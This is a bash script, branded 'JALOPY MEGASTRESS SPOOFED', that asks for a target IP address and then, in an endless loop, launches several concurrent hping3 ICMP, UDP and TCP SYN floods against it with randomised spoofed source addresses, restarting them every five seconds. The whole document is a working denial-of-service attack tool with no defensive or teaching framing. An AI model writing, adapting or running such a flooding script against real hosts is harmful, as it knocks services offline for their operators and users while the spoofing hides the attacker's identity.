#!/bin/bash

clear
echo -e "\e[1;34m================================="
echo -e "   JALOPY MEGASTRESS SPOOFED"
echo -e "=================================\e[0m"
echo ""

read -p "Enter the target IP address: " target

echo ""
echo -e "\e[1;34mLaunching heavy stress attack on $target...\e[0m"
sleep 2

while true
do
    echo -e "\e[1;32m[*] ICMP PING FLOOD (random source IP)\e[0m"
    sudo hping3 -1 --flood --rand-source -d 1400 -i u50 $target &

    echo -e "\e[1;33m[*] UDP FLOOD (random source IP)\e[0m"
    sudo hping3 --udp --flood --rand-source -d 1400 $target &

    echo -e "\e[1;31m[*] TCP SYN FLOOD (random source IP)\e[0m"
    sudo hping3 -S --flood --rand-source -p ++50 -d 1400 $target &

    echo -e "\e[1;36m[*] SECOND UDP FLOOD (port 443)\e[0m"
    sudo hping3 --udp --flood --rand-source -p 443 -d 1400 -i u100 $target &

    echo -e "\e[1;35m[*] SECOND TCP SYN FLOOD (port 22)\e[0m"
    sudo hping3 -S --flood --rand-source -p 22 -d 1400 -i u150 $target &

    sleep 5

    sudo pkill hping3
done
